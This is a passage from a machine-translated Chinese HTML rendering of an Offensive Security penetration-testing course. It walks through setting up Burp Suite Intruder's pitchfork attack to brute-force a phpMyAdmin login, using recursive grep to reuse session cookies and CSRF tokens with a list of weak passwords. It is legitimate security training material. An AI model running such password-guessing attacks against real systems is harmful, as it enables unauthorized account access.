<div style="position:absolute;top:75163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击类型</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">254</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置</font><font style="vertical-align: inherit;">为“干草叉”，允许我们为每个位置设置唯一的有效载荷列表。</font></font></nobr></div>
<div style="position:absolute;top:75182;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这对于解释我们要发送的有效载荷值的差异是必要的。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:75201;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">干草叉攻击会将每个列表中的第一个值放入各自的位置，然后发送</font></font></nobr></div>
<div style="position:absolute;top:75221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求。</font><font style="vertical-align: inherit;">下一个请求将使用每个列表中的第二个值，依此类推。</font><font style="vertical-align: inherit;">有几个</font></font></nobr></div>
<div style="position:absolute;top:75240;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Intruder 中的其他攻击类型，但我们不会在这里审查它们。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:75558;left:345"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 126：设置有效载荷位置</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:75589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用我们需要的有效载荷配置“干草叉”攻击可能有点令人困惑。</font><font style="vertical-align: inherit;">务必</font></font></nobr></div>
<div style="position:absolute;top:75608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在尝试跟随之前通读整个部分。</font></font></nobr></div>
<div style="position:absolute;top:75641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们需要在“</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项”选项</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卡</font><font style="vertical-align: inherit;">上配置一些有效负载，</font><font style="vertical-align: inherit;">然后才能使用它们，因此我们将</font></font></nobr></div>
<div style="position:absolute;top:75660;left:109"><nobr><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">暂时</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跳过</font><i><font style="vertical-align: inherit;">有效载荷</font></i><font style="vertical-align: inherit;">选项卡。</font><font style="vertical-align: inherit;">我们需要一些可以从数据中提取值的东西</font></font></nobr></div>
<div style="position:absolute;top:75680;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">响应并将它们注入到下一个请求中。</font><font style="vertical-align: inherit;">Burp Suite 包含一个“递归 grep”有效载荷</font></font></nobr></div>
<div style="position:absolute;top:75699;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 grep </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">255</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索响应以</font><font style="vertical-align: inherit;">获取预定义值并使结果可用于</font></font></nobr></div>
<div style="position:absolute;top:75718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下一个请求。</font><font style="vertical-align: inherit;">这正是我们需要设置</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">phpMyAdmin</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> cookie 值的地方，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">set_session</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> post</font></font></nobr></div>
<div style="position:absolute;top:75738;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正文值和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">令牌</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字段。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:76059;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">254 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（PortSwigger，2019 年），https://portswigger.net/burp/documentation/desktop/tools/intruder/positions#attack-type</font></font></font></nobr></div>
<div style="position:absolute;top:76079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">255 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Grep</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:76207;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="65"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 65 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:76240;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:77317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:77317;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:77317;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">285</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:76330;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.1.2.7</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:76351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们点击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Options</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后</font><font style="vertical-align: inherit;">点击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Add</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始配置我们的第一个 Recursive Grep 负载。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:76764;left:377"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 127：添加 Grep 提取物</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:76796;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这将打开一个带有 HTTP 响应的新窗口，我们可以使用它来定义</font></font></nobr></div>
<div style="position:absolute;top:76815;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们要提取的项目。</font><font style="vertical-align: inherit;">我们不想使用“Set-Cookie”标头来提取会话</font></font></nobr></div>
<div style="position:absolute;top:76834;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值，因为服务器设置了</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">phpMyAdmin</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> cookie 的</font><font style="vertical-align: inherit;">多个实例，</font><font style="vertical-align: inherit;">并且 Burp 将始终</font></font></nobr></div>
<div style="position:absolute;top:76853;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用它找到的第一个实例。</font><font style="vertical-align: inherit;">我们需要在 HTTP 响应窗口中向下滚动到</font></font></nobr></div>
<div style="position:absolute;top:76873;left:109"><nobr><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录表单中的</font><i><font style="vertical-align: inherit;">set_session</font></i><font style="vertical-align: inherit;">隐藏输入字段。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:77395;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="66"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 66 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:77428;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:78505;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:78505;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:78505;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">286</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:77518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.1.2.8</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:77539;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将单击并选择输入字段的值。</font><font style="vertical-align: inherit;">当我们这样做时，Burp 会自动设置</font></font></nobr></div>
<div style="position:absolute;top:77558;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“在表达式之后开始”和“在分隔符结束”值将 grep 提取的分隔符定义为</font></font></nobr></div>
<div style="position:absolute;top:77577;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如下所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:78215;left:309"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 128：为会话定义 Grep 提取</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:78246;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ok</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保存提取，然后通过单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Add</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> from </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Intruder</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> &gt; </font><i><font style="vertical-align: inherit;">2</font></i><font style="vertical-align: inherit;">定义另一个提取</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:78265;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:78583;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="67"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 67 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:78616;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:79693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:79693;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:79693;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">287</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:78706;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.1.2.9</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:78727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这次我们需要选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">token</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字段</font><font style="vertical-align: inherit;">的内容</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:79364;left:354"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 129：定义 Grep 提取</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:79395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">同样，我们将单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确定</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保存第二个提取。</font></font></nobr></div>
<div style="position:absolute;top:79428;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经定义了“递归 Grep”有效载荷，我们需要通过单击来设置我们的有效载荷</font></font></nobr></div>
<div style="position:absolute;top:79447;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项卡。</font><font style="vertical-align: inherit;">我们将总共设置四个有效载荷。</font><font style="vertical-align: inherit;">每个都有</font><font style="vertical-align: inherit;">一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Payload 设置</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值</font></font></nobr></div>
<div style="position:absolute;top:79466;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们标记的位置，它们按顺序匹配位置。</font><font style="vertical-align: inherit;">换句话说，设置一是为了</font></font></nobr></div>
<div style="position:absolute;top:79486;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">session cookie，设置二为会话字段，设置三为密码字段，设置四为</font></font></nobr></div>
<div style="position:absolute;top:79505;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">令牌字段。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:79771;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="68"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 68 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:79804;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:80881;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:80881;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:80881;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">288</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:79894;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.1.2.10</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:79915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效负载集一是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">phpMyAdmin</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话 cookie 值。</font><font style="vertical-align: inherit;">我们需要选择“Recursive Grep”</font></font></nobr></div>
<div style="position:absolute;top:79934;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类型，然后单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">From [_session" value="] to [" /&gt;Log]</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为我们的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Payload Option</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:80348;left:360"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 130：设置有效负载值</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:80379;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷集二是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">set_session</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值。</font><font style="vertical-align: inherit;">它需要匹配</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">phpMyAdmin</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> cookie</font><font style="vertical-align: inherit;">的值</font><font style="vertical-align: inherit;">，</font></font></nobr></div>
<div style="position:absolute;top:80398;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所以我们将使用与有效载荷设置相同的设置 - “Recursive Grep”作为类型和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">From</font></font></i></nobr></div>
<div style="position:absolute;top:80417;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[_session" value="] 到 [" /&gt;Log]</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为我们的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Payload Option</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:80959;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="69"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 69 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:80992;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:82069;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:82069;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:82069;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">289</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:81082;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.1.2.11</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:81103;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Payload 集三是密码值。</font><font style="vertical-align: inherit;">我们将其配置为使用“简单列表”有效负载类型。</font></font></nobr></div>
<div style="position:absolute;top:81122;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">顾名思义，这种负载类型使用一个简单的字符串列表。</font><font style="vertical-align: inherit;">我们可以向列表中添加值</font></font></nobr></div>
<div style="position:absolute;top:81141;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过在文本框中手动输入密码并单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">我们将重复此操作以输入多个</font></font></nobr></div>
<div style="position:absolute;top:81161;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">常用密码。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:81574;left:368"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 131：输入密码 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:82147;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="70"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 70 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:82180;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:83257;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:83257;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:83257;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">290</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:82270;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.1.2.12</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:82291;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，有效载荷集四是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">令牌</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值。</font><font style="vertical-align: inherit;">我们将再次使用“Recursive grep”有效载荷类型并且</font></font></nobr></div>
<div style="position:absolute;top:82310;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 [.php" /&gt;&lt;input type="hidden" name="token" value="] 到 [" /&gt;&lt;fieldset&gt;]</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为我们的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Payload Option</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:82844;left:342"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 132：配置有效负载集四</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:82875;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们已经执行了许多设置步骤，所以让我们在开始之前回顾一下我们所做的</font></font></nobr></div>
<div style="position:absolute;top:82894;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:83335;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="71"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 71 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:83368;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:84445;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:84445;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:84445;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">291</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:83458;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.1.2.13</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:83479;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们应该在 Positions 选项卡上标记四个位置：</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">phpMyAdmin</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> cookie</font><font style="vertical-align: inherit;">的值</font></font></nobr></div>
<div style="position:absolute;top:83498;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">set_session</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pma_password</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">token</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数</font><font style="vertical-align: inherit;">的 POST 正文值</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:83814;left:378"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 133：入侵者设置</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:83845;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们第一组和第二组的有效载荷是带有会话提取有效载荷的“递归 grep”。</font><font style="vertical-align: inherit;">我们的有效载荷</font></font></nobr></div>
<div style="position:absolute;top:83864;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第三组是一个带有我们弱密码的“简单列表”。</font><font style="vertical-align: inherit;">最后，我们第四组的有效载荷又是</font></font></nobr></div>
<div style="position:absolute;top:83884;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“反向grep”但带有令牌提取有效负载。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:84343;left:357"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 134：配置的所有有效负载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:84374;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们验证了这些设置，我们将单击“</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始攻击”</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">按钮。</font><font style="vertical-align: inherit;">这介绍了以下内容</font></font></nobr></div>
<div style="position:absolute;top:84393;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:84523;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="72"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 72 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:84556;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:85633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:85633;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:85633;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">292</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:84794;left:354"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 135：Burp 入侵者限制</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
